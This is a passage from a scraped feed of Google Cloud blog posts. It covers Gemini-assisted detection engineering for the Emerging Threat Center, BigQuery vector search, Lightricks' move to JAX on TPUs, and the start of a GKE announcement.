    \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_r7ehhhx.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Emerging Threat Center Campaign Detail View</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Under the hood: The detection engineering engine</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Emerging Threat Center is built on a resilient, automated system that uses Gemini models and AI agents to drastically shorten the detection engineering lifecycle.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_od3E6sZ.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Agentic Detection Engineering Workflow</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Here’s how it works.</span></p>\n<p><strong style=\"vertical-align: baseline;\">First, it ingests intelligence</strong><span style=\"vertical-align: baseline;\">. The system automatically ingests detection opportunities from Google Threat Intelligence campaigns, which are sourced from Mandiant's frontline incident response engagements, our Managed Defense customers, and Google's unique global visibility. From thousands of raw sample events from adversary activity, Gemini is able to extract a distinct set of detection opportunities associated with the campaign.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Next, it generates synthetic events</strong><span style=\"vertical-align: baseline;\">. We generate high-fidelity anonymized, synthetic event data that accurately mimics adversary tactics, techniques, and procedures (TTPs) described in the intelligence. We use an automated pipeline to generate a corpus of high-fidelity synthetic log events, providing a robust dataset for testing.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Then, it tests coverage</strong><span style=\"vertical-align: baseline;\">. The system uses the synthetic data to test our existing detection rule set, providing a rapid, empirical answer to how well we are covered for a new threat. This automated testing pipeline quickly provides an answer on detection coverage.</span></p>\n<p><strong style=\"vertical-align: baseline;\">After that, it accelerates rule creation</strong><span style=\"vertical-align: baseline;\">. When coverage gaps are found, the process uses Gemini to automatically generate and evaluate new rules. Gemini drafts a new detection rule and provides a summary of its logic and expected performance, reducing the time to create a production-ready rule from days to hours</span><strong style=\"vertical-align: baseline;\">.</strong></p>\n<p><strong style=\"vertical-align: baseline;\">Finally, it requires human review</strong><span style=\"vertical-align: baseline;\">. The new rule is submitted to a human-in-the-loop security analyst who can vet and verify the new rule before deploying it. AI has helped us transform a best-effort, manual process into a systematic, automated workflow. By enabling us to tie new detections directly to the intelligence campaign it covers, we can help you be prepared for the latest threats.</span></p>\n<p><span style=\"vertical-align: baseline;\">“The real strategic shift is moving past those single indicators to systematically detecting underlying adversary behaviors — that's how we get ahead and stay ahead. Out-of-box behavioral rules, based on Google's deep intel visibility, help us get there,” said Ron Smalley, senior vice-president and head of Cybersecurity Operations, Fiserv.</span></p>\n<p><span style=\"vertical-align: baseline;\">To dive deeper into the complete framework that powers this, read more about </span><a href=\"https://cloud.google.com/chronicle/docs/detection\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our applied threat intelligence</span></a><span style=\"vertical-align: baseline;\"> and watch our </span><a href=\"https://cloudonair.withgoogle.com/events/google-cloud-security-talks-november-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Security Talks</span></a><span style=\"vertical-align: baseline;\"> keynote.</span></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/the-story-of-bigquery-vector-search/",
        "title": "BigQuery under the hood: How Google brought embeddings to analytics",
        "thumbnail": null,
        "author": "Joe Malone",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Embeddings are a crucial component at the intersection of data and AI. As data structures, they encode the inherent meaning of the data they represent, and their significance becomes apparent when they are compared to one another. Vector search is a technique that uncovers the relative meaning of those embeddings by evaluating the distances between them within a shared space. </span></p>\n<p><span style=\"vertical-align: baseline;\">In early 2024, </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-new-vector-search-capabilities-in-bigquery?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">we launched vector search in the BigQuery data platform</span></a><span style=\"vertical-align: baseline;\">, making its powerful capabilities accessible to all BigQuery users. This effectively eliminated the need for specialized databases or complex AI workflows. Our ongoing efforts to democratize vector search has resulted in a unique approach that provides the scale, simplicity, and cost performance that BigQuery users expect. In this article, we reflect on the past two years, sharing insights gained from product development and customer interactions.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">In the before-times: Building vector search the hard way </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Before we added native support for vector search in BigQuery, building a scalable vector search solution was a complex, multi-step process. Data professionals had to:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Extract data from their data warehouse</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Generate embeddings using specialized machine learning infrastructure</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Load the embeddings into a dedicated vector database</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Maintain this additional infrastructure, including server provisioning, scaling, and index management</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Develop custom pipelines to join vector search results back to their core business data</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Deal with downtime during index rebuilds, a critical pain point for production systems</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This disjointed, expensive, and high-maintenance architecture was a barrier to entry for many teams.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">In the beginning: Focus on simplicity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We kicked off BigQuery vector search with one goal: to make the simplest vector database on the market. We built it to meet some core design requirements:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">It needs to be fully serverless:</strong><span style=\"vertical-align: baseline;\"> We knew early on that the best way to bring vector search to all BigQuery customers was to make it serverless. We first built the </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#create_an_ivf_vector_index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IVF index</span></a><span style=\"vertical-align: baseline;\">, combining the best of clustering and indexing, all within BigQuery. As a result, you don’t need to provision </span><strong style=\"vertical-align: baseline;\">any new servers whatsoever</strong><span style=\"vertical-align: baseline;\"> to use vector search in BigQuery. This means you don't have to manage any underlying infrastructure for your vector database, freeing up your team to focus on what matters most: your data. BigQuery handles the scaling, maintenance, and reliability automatically. It can scale effortlessly to handle billions of embeddings, so your solution can grow with your business.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Index maintenance should be as simple as possible:</strong><span style=\"vertical-align: baseline;\"> BigQuery’s vector indexes are a key part of this simplicity. You create an index with a simple </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create_vector_index_statement\"><code style=\"text-decoration: underline; vertical-align: baseline;\">CREATE VECTOR INDEX</code></a><span style=\"vertical-align: baseline;\"> SQL statement, and BigQuery handles the rest. As new data is ingested, the index </span><strong style=\"vertical-align: baseline;\">automatically and asynchronously refreshes</strong><span style=\"vertical-align: baseline;\"> to reflect the changes. And if the ingested data results in data distribution changes in the dataset, and in turn, in search accuracy degradation, it’s no problem: You can use the </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#rebuild_a_vector_index\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Model Rebuild</code></a><span style=\"vertical-align: baseline;\"> feature to completely rebuild your index, without any index downtime, and with just one SQL statement.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">It should be integrated with GoogleSQL and Python:</strong><span style=\"vertical-align: baseline;\"> You can perform vector searches directly within your existing SQL workflows using a simple </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/search_functions#vector_search\"><code style=\"text-decoration: underline; vertical-align: baseline;\">VECTOR_SEARCH</code></a><span style=\"vertical-align: baseline;\"> function. This makes it easy to combine semantic search with traditional queries and joins. For data scientists, the integration with Python and tools like </span><strong style=\"vertical-align: baseline;\">LangChain</strong><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/bigquery/docs/use-bigquery-dataframes\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery DataFrames</span></a><span style=\"vertical-align: baseline;\"> makes it a natural fit for building advanced machine learning applications.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consistency needs to be guaranteed:</strong><span style=\"vertical-align: baseline;\"> New data is searchable via the </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/search_functions#vector_search\"><code style=\"text-decoration: underline; vertical-align: baseline;\">VECTOR_SEARCH</code></a><span style=\"vertical-align: baseline;\"> function immediately after ingestion, providing accuracy and consistency of the search results. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">You only pay for what you use:</strong><span style=\"vertical-align: baseline;\"> The </span><a href=\"https://cloud.google.com/bigquery/docs/vector-search-intro#pricing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery vector search pricing model</span></a><span style=\"vertical-align: baseline;\"> is designed for flexibility. This \"pay as you go\" model is great for both ad-hoc analyses and highly price-performant batch queries. This model emphasizes the ease of trying out the feature without a significant upfront investment.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Security is a given:</strong><span style=\"vertical-align: baseline;\"> BigQuery’s security infrastructure offers robust data -access control through </span><a href=\"https://cloud.google.com/bigquery/docs/row-level-security-intro\"><span style=\"text-decoration: underline; vertical-align: baseline;\">row-level security</span></a><span style=\"vertical-align: baseline;\"> (RLS) and </span><a href=\"https://cloud.google.com/bigquery/docs/column-level-security-intro\"><span style=\"text-decoration: underline; vertical-align: baseline;\">column-level security</span></a><span style=\"vertical-align: baseline;\"> (CLS). This multi-layered approach guarantees that users can only access authorized data, thereby bolstering protection and ensuring compliance.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">The early days: Growing with our customers</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As customers found success with early projects and moved more data into BigQuery, they told us about many data science workflows that they were “updating” to use new embedding-based approaches. Here are a few examples of the various applications that vector search can enhance:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">LLM applications with retrieval augmented generation (RAG)</strong><span style=\"vertical-align: baseline;\">: By providing relevant business data, vector search helps ensure accurate and grounded responses from large language models.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Semantic search on business data</strong><span style=\"vertical-align: baseline;\">: Enable powerful, natural-language search capabilities for both internal and external users. For instance, a marketing team could search for \"customers who have a similar purchasing history to Jane\" and receive a list of semantically similar customer profiles.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Customer 360 and deduplication</strong><span style=\"vertical-align: baseline;\">: Use embeddings to identify similar customer records, even if details like names or addresses differ slightly. This is an effective way to cleanse and consolidate data for a more accurate, single view of your customer.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Log analytics and anomaly detection</strong><span style=\"vertical-align: baseline;\">: Ingest log data as embeddings and use vector search to quickly find similar log entries, even if the exact text doesn't match. This helps security teams identify potential threats and anomalies much faster.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enhance product recommendations</strong><span style=\"vertical-align: baseline;\">: Suggest visually or textually similar items (e.g., clothing) or semantically related complementary products.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Where we are now: Improving scale and cost performance</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As customer usage grew, we enhanced our offering, observing significant demand for batch processing beyond RAG and generative AI workloads. Unlike traditional vector databases, improved batch vector search in BigQuery excels at high-throughput, analytical similarity searches on massive datasets. This allows data scientists to analyze billions of records simultaneously within their existing data environment, enabling previously prohibitive tasks such as:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Large-scale clustering:</strong><span style=\"vertical-align: baseline;\"> Grouping every customer in a database based on their behavioral embeddings</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Comprehensive anomaly detection:</strong><span style=\"vertical-align: baseline;\"> Finding the most unusual transaction for every single account in a financial ledger</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Bulk item categorization:</strong><span style=\"vertical-align: baseline;\"> Classifying millions of text documents or product images simultaneously</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In the second phase of development, we launched many new features to further improve the vector search experience:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">TreeAH, built using the ScaNN index, provides significant product differentiation in price / performance. Our customers’ data science teams were moving more of their recommendation, clustering, and data pipelines to use vector search. We saw great improvements using </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-scann-in-bigquery-vector-search-for-large-query-batches\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TreeAH</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Various internal improvements to help increase the training and indexing performance and usability. For example, we added asynchronous index training, which increases usability and scalability as massive index training jobs are moved into the background. We also performed various internal optimizations to improve indexing performance, and reduce indexing latency without incurring additional costs for users. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/vector-index#stored-columns\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Stored columns</span></a><span style=\"vertical-align: baseline;\"> to help improve vector search performance:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Users can apply prefilers on the stored columns in the vector search query to greatly optimize search performance without sacrificing search accuracy.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If users only query stored columns in the vector search query, search performance can be further improved by avoiding expensive joins with the base table.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/vector-index#partitions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Partitioned indexes</span></a><span style=\"vertical-align: baseline;\"> to dramatically reduce I/O costs and accelerate query performance by skipping irrelevant partitions. This is especially powerful for customers who frequently filter on partitioning columns, such as a date or region.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/vector-index#rebuild_a_vector_index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Index model rebuilds</span></a><span style=\"vertical-align: baseline;\"> to help ensure that vector search results remain accurate and relevant over time. As your base data evolves, you can now proactively correct for model drift, maintaining the high performance of your vector search applications without index downtime.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead: Indexing all the things</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As businesses look to agentic AI, the data platform has never been more important. We imagine a world in which every business has their own AI mode for productivity, and retrieving relevant data is at the heart of productivity, including intelligent indexing of all relevant enterprise data, structured or unstructured, to automate AI and analytics. Indexing and search is core to Google. We look forward to sharing relevant technology innovations with you!</span></p></div>",
        "published_date": "2025-11-11 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/media-entertainment/how-lightricks-trains-video-diffusion-models-at-scale-with-jax-on-tpu/",
        "title": "How Lightricks trains video diffusion models at scale with JAX on TPU",
        "thumbnail": null,
        "author": "Yoav HaCohen, PhD",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"font-style: italic; vertical-align: baseline;\">Training large video diffusion models at scale isn't just computationally expensive — it can become impossible when your framework can't keep pace with your ambitions. </span></p>\n<p><a href=\"http://jax.dev\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">JAX</span></a><span style=\"font-style: italic; vertical-align: baseline;\"> has become a popular computational framework across AI applications, now recognized for its capabilities in training large-scale AI models, such as LLMs and </span><a href=\"https://cloud.google.com/blog/topics/customers/escalante-uses-jax-on-tpus-for-ai-driven-protein-design\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">life sciences models</span></a><span style=\"font-style: italic; vertical-align: baseline;\">. Its strength lies not just in performance but in an expressive, scalable design that gives innovators the tools to push the boundaries of what's possible. We're consistently inspired by how researchers and engineers leverage JAX's ecosystem to solve unique, domain-specific challenges — including applications for generative media.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Today, we're excited to share the story of </span><a href=\"https://www.lightricks.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">Lightricks</span></a><span style=\"font-style: italic; vertical-align: baseline;\">, a company at the forefront of the creator economy. Their </span><a href=\"https://ltx.studio/blog/ltx-2-the-complete-ai-creative-engine-for-video-production\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">LTX-Video</span></a><span style=\"font-style: italic; vertical-align: baseline;\"> team is building high-performance video generation models, and their journey is a masterclass in overcoming technical hurdles. I recently spoke with Yoav HaCohen and Yaki Bitterman, who lead the video and scaling teams, respectively. They shared their experience of hitting a hard scaling wall with their previous framework and how a strategic migration to JAX became the key to unlocking the performance they needed.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Here, Yoav and Yaki tell their story in their own words. – </span><strong style=\"font-style: italic; vertical-align: baseline;\">Srikanth Kilaru</strong><span style=\"font-style: italic; vertical-align: baseline;\">, Senior Product Manager, Google ML Frameworks</span></p>\n<hr />\n<h3><strong style=\"vertical-align: baseline;\">The creator's challenge</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At Lightricks, our goal has always been to bring advanced creative technology to consumers. With apps like </span><a href=\"https://www.facetuneapp.com/?srsltid=AfmBOoo8ZXXKPBsz1wyL8Rvq9ZtL65N9K51p_yyRjM1DoH6EqZ1oEkLQ\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Facetune</span></a><span style=\"vertical-align: baseline;\">, we saw the power of putting sophisticated editing tools directly into people's hands. When generative AI emerged, we knew it would fundamentally change content creation.</span></p>\n<p><span style=\"vertical-align: baseline;\">We launched </span><a href=\"https://ltx.studio/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LTX Studio</span></a><span style=\"vertical-align: baseline;\"> to build generative video tools that truly serve the creative process. Many existing models felt like a \"prompt and pray\" experience, offering little control and long rendering times that stifled creativity. We needed to build our own models—ones that were not only efficient but also gave creators the controllability they deserve.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our initial success came from training our first real-time video generation model on </span><a href=\"https://cloud.google.com/tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud TPUs </span></a><span style=\"vertical-align: baseline;\">with </span><a href=\"https://docs.pytorch.org/xla/release/r2.8/index.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PyTorch/XLA</span></a><span style=\"vertical-align: baseline;\">. But as our ambitions grew, so did the complexity. When we started developing our </span><a href=\"https://www.prnewswire.com/news-releases/lightricks-launches-13b-parameters-ltx-video-model-breakthrough-rendering-approach-generates-high-quality-efficient-ai-video-30x-faster-than-comparable-models-302447660.html#:~:text=LTXV%2D13B%20introduces%20%22multiscale%20rendering,LTX%20Video%20in%20the%20marketplace.\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">13-billion-parameter model</span></a><span style=\"vertical-align: baseline;\">, we hit a wall.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Hitting the wall and making the switch</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our existing stack wasn’t delivering the training step times and scalability we needed. After exploring optimization options, we decided to shift our approach. We paused development to rewrite our entire training codebase in JAX, and the results were immediate. Switching to JAX felt like a magic trick, instantly providing the necessary runtimes.</span></p>\n<p><span style=\"vertical-align: baseline;\">This transition enabled us to effectively scale our tokens per sample (the amount of data processed in each training step), model parameters, and chip count. With JAX, sharding strategies (sharding divides large models across multiple chips) that previously failed now work out of the box on both small and large pods (clusters of TPU chips).</span></p>\n<p><span style=\"vertical-align: baseline;\">These changes delivered linear scaling that translates to 40% more training steps per day — directly accelerating model development and time to market. Critical issues with FlashAttention and data loading also worked reliably. As a result, our team's productivity skyrocketed, doubling the number of pull requests we could merge in a week.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Why JAX worked: A complete ecosystem for scale</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The success wasn't just about raw speed; it was about the entire </span><a href=\"https://docs.jax.dev/en/latest/index.html#ecosystem\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JAX stack</span></a><span style=\"vertical-align: baseline;\">, which provided the building blocks for scalable and efficient research.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">A clear performance target with MaxText:</strong><span style=\"vertical-align: baseline;\"> We used the open-source </span><a href=\"https://github.com/AI-Hypercomputer/maxtext\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MaxText </span></a><span style=\"vertical-align: baseline;\">framework as a baseline to understand what acceptable performance looked like for a large model on TPUs. This gave us a clear destination and the confidence that our performance goals were achievable on the platform.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">A robust toolset:</strong><span style=\"vertical-align: baseline;\"> We built our new stack on the core components of the JAX ecosystem based on the MaxText blueprint. We used </span><a href=\"https://flax.readthedocs.io/en/v0.8.3/index.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Flax</span></a><span style=\"vertical-align: baseline;\"> for defining our models, </span><a href=\"https://optax.readthedocs.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Optax</span></a><span style=\"vertical-align: baseline;\"> for implementing optimizers, and </span><a href=\"https://orbax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Orbax</span></a><span style=\"vertical-align: baseline;\"> for robust checkpointing — all core components that work together natively.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Productive development and testing:</strong><span style=\"vertical-align: baseline;\"> The transition was remarkably smooth. We implemented unit tests to compare our new JAX implementation with the old one, ensuring correctness every step of the way. A huge productivity win was discovering that we could test our </span><a href=\"https://docs.jax.dev/en/latest/notebooks/Distributed_arrays_and_automatic_parallelization.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">sharding</span></a><span style=\"vertical-align: baseline;\"> logic on a single, cheap CPU before deploying to a large TPU slice. This allowed for rapid, cost-effective iteration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Checkpointing reliability:</strong><span style=\"vertical-align: baseline;\"> For sharded models, JAX’s checkpointing is much more reliable than before, making training safer and more cost-effective.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Compile speed &amp; memory:</strong><span style=\"vertical-align: baseline;\"> JAX compilation with </span><a href=\"https://docs.jax.dev/en/latest/_autosummary/jax.lax.fori_loop.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">lax.fori_loop</span></a><span style=\"vertical-align: baseline;\"> is fast and uses less memory, freeing capacity for tokens and gradients.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Smooth scaling on a supercomputer:</strong><span style=\"vertical-align: baseline;\"> With our new JAX codebase, we were able to effectively train on a reservation of thousands of TPU cores. We chose TPUs because Google provides access to what we see as a \"</span><a href=\"https://cloud.google.com/solutions/ai-hypercomputer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">supercomputer</span></a><span style=\"vertical-align: baseline;\">\" — a fully integrated system where the </span><a href=\"https://cloud.google.com/tpu/docs/system-architecture-tpu-vm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">interconnects and networking</span></a><span style=\"vertical-align: baseline;\"> were designed first, not as an afterthought. We manage these large-scale training jobs with our own custom Python scripts on </span><a href=\"https://cloud.google.com/products/compute\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Compute Engine (GCE)</span></a><span style=\"vertical-align: baseline;\">, giving us direct control over our infrastructure. We also use </span><a href=\"https://cloud.google.com/storage\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Storage</span></a><span style=\"vertical-align: baseline;\"> and stream the training data to the TPU virtual machines.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"JAX-Stack-Lightricks-Architecture\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/JAX-Stack-Lightricks-Architecture.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Architectural diagram showing the Lightricks stack</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><hr />\n<h3><strong style=\"vertical-align: baseline;\">Build your models with the JAX ecosystem</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Lightricks' story is a great example of how JAX's powerful, modular, and scalable design can help teams overcome critical engineering hurdles. Their ability to quickly pivot, rebuild their stack, and achieve massive performance gains is a testament to both their talented team and the tools at their disposal.</span></p>\n<p><span style=\"vertical-align: baseline;\">The JAX team at Google is committed to supporting innovators like Lightricks and the entire scientific computing community.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Share your story</strong><span style=\"vertical-align: baseline;\">: Are you using JAX to tackle a challenging scientific problem? We would love to learn how JAX is accelerating your research.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Help guide our roadmap</strong><span style=\"vertical-align: baseline;\">: Are there new features or capabilities that would unlock your next breakthrough? Your feature requests are essential for guiding the evolution of JAX.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Please reach out to the team via</span> <a href=\"https://github.com/google/jax\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GitHub</span></a><span style=\"vertical-align: baseline;\"> to share your work or discuss what you need from JAX. Check out documentation, examples, news, events and more at </span><a href=\"http://jaxstack.ai\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">jaxstack.ai</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"http://jax.dev\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">jax.dev</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Sincere thanks to Yoav, Yaki, and the entire Lightricks team for sharing their insightful journey with us. We're excited to see what they create next.</span></p></div>",
        "published_date": "2025-11-11 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/gke-and-kubernetes-at-kubecon-2025/",
        "title": "GKE: From containers to agents, the unified platform for every modern workload",
        "thumbnail": null,
        "author": "Drew Bradstock",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The past decade of cloud native infrastructure has been defined by relentless change — from containerization and microservices to the rise of generative AI. Through every shift, Kubernetes has been the constant, delivering stability and a uniform, scalable operational model for both applications and infrastructure.</span></p>\n<p><span style=\"vertical-align: baseline;\">As Google Kubernetes Engine (GKE) celebrates its 10th anniversary, its symbiotic relationship with Kubernetes has never been more important. </span><span style=\"vertical-align: baseline;\">With </span><span style=\"vertical-align: baseline;\">the increasing demand for Kubernetes to handle AI at its highest scale, Google continues to invest in strengthening Kubernetes’ core capabilities, elevating all workloads — AI and non-AI alike. At </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-at-kubecon-north-america-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">KubeCon</span></a><span style=\"vertical-align: baseline;\"> North America this year, we’re announcing major advancements that reflect our holistic 